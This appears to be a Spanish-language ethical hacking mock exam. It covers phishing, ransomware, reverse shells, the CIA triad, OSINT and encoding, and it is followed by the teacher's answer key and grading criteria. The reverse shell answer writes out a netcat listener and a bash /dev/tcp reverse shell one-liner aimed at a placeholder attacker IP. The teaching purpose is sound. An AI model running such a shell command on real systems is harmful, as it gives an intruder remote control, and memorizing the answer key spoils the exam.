# Simulacro de Examen — Hacking Ético

> Instrucciones: responde cada pregunta como si fuera el examen real.
> Cubre la sección de respuestas hasta terminar.
> Tiempo recomendado: **60 minutos**. Puntuación total: **10 puntos**.
> Estructura: 2 teoría RA1 (2 pts c/u) + 1 CTF RA1 (1 pt) + 2 teoría RA2 (2 pts c/u) + 1 CTF RA2 (1 pt)

---

# PARTE I — PREGUNTAS

*(No mires las respuestas hasta terminar)*

---

## RA1 — Propone soluciones a ciberataques detectados

**Pregunta 1 — Teoría** *(2 puntos)*

Un empleado del departamento financiero informa de que introdujo sus credenciales en una página web que simulaba ser el portal corporativo de gestión de nóminas. Minutos después, el sistema detecta un acceso a su cuenta desde una IP en otro país.

- a) Analiza el tipo de ataque sufrido y cómo pudo llevarse a cabo.
- b) Explica qué impacto tiene sobre la seguridad de la organización.
- c) Propón medidas de actuación inmediata y de prevención a largo plazo.

```
Respuesta:




```

---

**Pregunta 2 — Teoría** *(2 puntos)*

Una organización descubre que los archivos de su servidor de ficheros han cambiado de extensión y aparece un mensaje en pantalla exigiendo el pago de 3 bitcoins para recuperar el acceso. El sistema de ventas y el ERP están inaccesibles.

- a) Identifica el tipo de ataque, explica su funcionamiento y sus posibles vectores de entrada.
- b) Describe las acciones que deben tomarse de forma inmediata.
- c) Propón medidas técnicas y organizativas para prevenir este tipo de ataque en el futuro.

```
Respuesta:




```

---

**Pregunta 3 — CTF** *(1 punto)*

Durante la práctica de reverse shell, estableciste una conexión entre la máquina víctima y tu equipo atacante.

- a) Explica paso a paso cómo configuraste la parte atacante y la víctima.
- b) ¿Qué tipo de control obtuviste una vez establecida la conexión?
- c) ¿Qué controles podrían detectar o impedir este tipo de conexión?

```
Respuesta:




```

---

## RA2 — Analiza la seguridad aplicando las técnicas de una posible amenaza

**Pregunta 4 — Teoría** *(2 puntos)*

En una organización se detecta el siguiente incidente: se ha accedido a la base de datos de clientes sin autorización, se han modificado registros contables alterando importes de facturas, y el sistema de ventas online ha dejado de responder durante 6 horas.

Explica cómo se ven afectados los tres principios de la tríada CIA en este escenario, indicando qué representa cada uno y proporcionando un ejemplo concreto de cada afectación.

```
Respuesta:




```

---

**Pregunta 5 — Teoría** *(2 puntos)*

Durante un análisis de seguridad encargado por una empresa, el técnico obtiene información a través de buscadores, registros WHOIS, LinkedIn y repositorios públicos de código, sin interactuar en ningún momento con los sistemas de la organización.

- a) Identifica qué técnica se está aplicando y en qué fase del proceso de hacking ético se encuadra.
- b) Describe qué tipo de información relevante puede obtenerse con esta técnica.
- c) Explica cómo podría ser utilizada esta información en fases posteriores del ataque.

```
Respuesta:




```

---

**Pregunta 6 — CTF** *(1 punto)*

Durante la práctica de ofuscación con la máquina odyssey_v2, encontraste datos codificados en distintos formatos.

- a) Explica la diferencia entre un dato codificado y un dato cifrado.
- b) ¿Qué herramientas usaste para decodificar la información encontrada y cómo las aplicaste?

```
Respuesta:




```

---
---
---

# PARTE II — CORRECCIÓN DEL PROFESOR

---

## RESPUESTA 1 — Phishing *(2 pts)*

**a) Tipo de ataque (0,6 pts)**
> Phishing / Spear phishing. El atacante clonó el portal corporativo o usó typosquatting del dominio y envió al empleado un correo que lo redirigía a la web falsa. Al introducir sus credenciales, el atacante las capturó y las usó para acceder desde el exterior.

**b) Impacto en CIA (0,6 pts)**
> - Confidencialidad: credenciales del dpto. financiero expuestas → acceso a información económica sensible
> - Integridad: el atacante puede modificar datos contables con el acceso obtenido
> - Disponibilidad: si cambia la contraseña, el empleado pierde acceso a su cuenta

**c) Inmediata + prevención (0,8 pts)**
- Resetear credenciales INMEDIATAMENTE + revocar sesiones activas
- Revisar logs de acceso para determinar qué consultó el atacante
- Verificar si se enviaron emails desde la cuenta comprometida
- **Largo plazo:** MFA/2FA · SPF/DKIM/DMARC · formación antiphishing con simulacros

**Palabras clave:** "phishing" · "suplantación de identidad" · "MFA" · "revocar sesiones" · "logs"

**Trampa:** Decir que instaló malware. El phishing no instala nada — el usuario entrega sus credenciales voluntariamente (aunque engañado).

---

## RESPUESTA 2 — Ransomware *(2 pts)*

**a) Ataque, funcionamiento, vectores (0,6 pts)**
> Ransomware — cifra archivos y exige rescate económico. Los modernos usan doble extorsión (exfiltran antes de cifrar). Vectores: adjunto phishing, RDP expuesto, vulnerabilidad web.

**b) Acciones inmediatas (0,7 pts)**
> 1. Aislar equipos de la red INMEDIATAMENTE (impedir propagación)
> 2. NO apagar (RAM puede contener evidencias forenses)
> 3. NO pagar (no garantiza recuperación, financia ataques)
> 4. Preservar evidencias: mensaje de rescate, logs de red

**c) Prevención (0,7 pts)**
> - Regla 3-2-1 de backups: 3 copias, 2 medios, 1 offsite **aislado de la red**
> - Segmentación de red para limitar propagación lateral
> - EDR con detección de cifrado masivo · formación antiphishing

**Palabras clave:** "cifra archivos" · "rescate" · "no apagar" · "aislar de la red" · "backups aislados" · "3-2-1"

**Trampa:** Decir "apagar el equipo" como primera medida. Error grave — destruye evidencias forenses en RAM.

---

## RESPUESTA 3 — Reverse Shell *(1 pt)*

**a) Configuración (0,5 pts)**
```bash
# Atacante (Kali) — abrir listener
nc -lvnp 4444

# Víctima — payload via command injection o webshell
bash -i >& /dev/tcp/IP_ATACANTE/4444 0>&1
```
> La víctima inicia la conexión hacia el atacante (por eso es "reverse" — invierte la dirección habitual).

**b) Control obtenido (0,25 pts)**
> Shell interactiva como `www-data`. Se puede navegar el sistema, leer archivos, escalar privilegios, hacer pivoting.

**c) Defensas (0,25 pts)**
> Egress filtering en el firewall · IDS/SIEM con alertas de conexiones salientes en puertos no estándar · principio de mínimo privilegio

**Palabras clave:** `nc -lvnp` · `bash -i >& /dev/tcp/` · "la víctima inicia la conexión" · `www-data`

**Trampa:** Describir una bind shell (el atacante conecta a la víctima) en lugar de una reverse shell (la víctima conecta al atacante).

---

## RESPUESTA 4 — Tríada CIA completa *(2 pts)*

**Confidencialidad (0,6 pts)**
> Garantiza que solo acceden los autorizados. **Vulnerada:** acceso no autorizado a la BD de clientes → datos personales expuestos.

**Integridad (0,7 pts)**
> Garantiza que los datos no se alteran sin autorización. **Vulnerada:** registros contables modificados (importes de facturas alterados) → datos no fiables.

**Disponibilidad (0,7 pts)**
> Garantiza que el sistema es accesible cuando se necesita. **Vulnerada:** sistema de ventas inaccesible 6 horas → operativa interrumpida.

**Palabras clave:** definición de cada principio + ejemplo concreto del escenario para los tres

**Trampa:** Describir los tres principios sin conectarlos al escenario. El profesor exige el ejemplo específico (BD de clientes, facturas modificadas, sistema caído) para cada uno.

---

## RESPUESTA 5 — OSINT *(2 pts)*

**a) Técnica y fase (0,5 pts)**
> OSINT (Open Source Intelligence) / reconocimiento pasivo. Fase 1 de la Kill Chain. "Pasivo" porque no interactúa con los sistemas — no deja rastro en los logs del objetivo.

**b) Información obtenible (0,7 pts)**

| Fuente | Información |
|--------|------------|
| Buscadores | Subdominios, documentos indexados, tecnologías |
| WHOIS | Titulares del dominio, IPs, servidores DNS |
| LinkedIn | Empleados, cargos, tecnologías usadas |
| GitHub | Código fuente, credenciales hardcodeadas, tokens |

**c) Uso en fases posteriores (0,8 pts)**
> Spear phishing personalizado con nombres y cargos reales · explotar CVEs de versiones de software detectadas · acceso directo con credenciales encontradas en repos

**Palabras clave:** "OSINT" · "reconocimiento pasivo" · "no interactúa con los sistemas" · al menos 3 fuentes · "spear phishing" o "CVEs"

**Trampa:** Incluir nmap o gobuster como parte del OSINT. Esas herramientas son reconocimiento **activo** — interactúan con los sistemas y dejan rastro.

---

## RESPUESTA 6 — Codificado vs. Cifrado *(1 pt)*

**a) Diferencia (0,5 pts)**

| | Codificado | Cifrado |
|--|------------|---------|
| Objetivo | Cambiar formato de representación | Proteger el contenido |
| Seguridad | **Ninguna** — reversible sin clave | Alta — requiere clave |
| Ejemplos | Base64, hex, ROT13 | AES, RSA, bcrypt |

> Base64 y hex **no son seguridad**. Cualquier herramienta estándar los revierte en segundos.

**b) Herramientas en odyssey_v2 (0,5 pts)**
```bash
echo "Y2FsaWZvcm5pYQ==" | base64 -d        # decodificar base64 → contraseña
xxd -r -p <<< "63616c69666f726e6961"        # decodificar hex
steghide extract -sf 1.jpg -p "1234_sec"   # extraer datos ocultos de imagen
```

**Palabras clave:** "codificado ≠ seguridad" · "no requiere clave" · `base64 -d` · `xxd -r -p` · `steghide extract -sf`

**Trampa:** Decir que base64 "cifra" los datos. Base64 solo codifica (cambia representación) — no protege nada.

---

# TABLA DE PUNTUACIÓN

| Pregunta | Tema | Pts | Mis pts |
|----------|------|-----|---------|
| 1 RA1 Teoría | Phishing | 2,00 | |
| 2 RA1 Teoría | Ransomware | 2,00 | |
| 3 RA1 CTF | Reverse shell | 1,00 | |
| 4 RA2 Teoría | Tríada CIA completa | 2,00 | |
| 5 RA2 Teoría | OSINT | 2,00 | |
| 6 RA2 CTF | Codificado vs. cifrado | 1,00 | |
| **TOTAL** | | **10,00** | |

**Escala:** 9-10 Excelente · 7-8,9 Bien · 5-6,9 Justo · <5 Repetir simulacro en 2 días

---

*Para el CTF: menciona el nombre de la máquina, escribe comandos exactos con parámetros, describe el resultado real que obtuviste.*
